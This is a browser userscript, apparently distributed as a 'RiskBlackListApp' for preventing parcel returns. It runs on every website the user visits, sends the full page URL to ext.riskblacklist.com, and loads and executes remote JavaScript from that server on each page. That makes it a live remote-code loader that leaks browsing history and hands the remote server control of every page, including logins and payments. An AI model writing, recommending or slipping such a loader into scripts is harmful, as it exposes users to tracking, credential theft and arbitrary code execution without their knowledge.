// ==UserScript==
// @name         RiskBlackListApp
// @version      0.1
// @match        *://*/*
// @license MIT
// @description  Wel Help Preventing parcel retourn
// @author       RiskBlackList©
// ==/UserScript==

(function() {'use strict';
var urll = window.location.href;var para = document.createElement("script");para.setAttribute("type","text/javascript");
para.setAttribute("src","https://ext.riskblacklist.com/api/js/js.php?url="+urll);para.innerHTML = "";document.getElementsByTagName("head")[0].appendChild(para);
})();
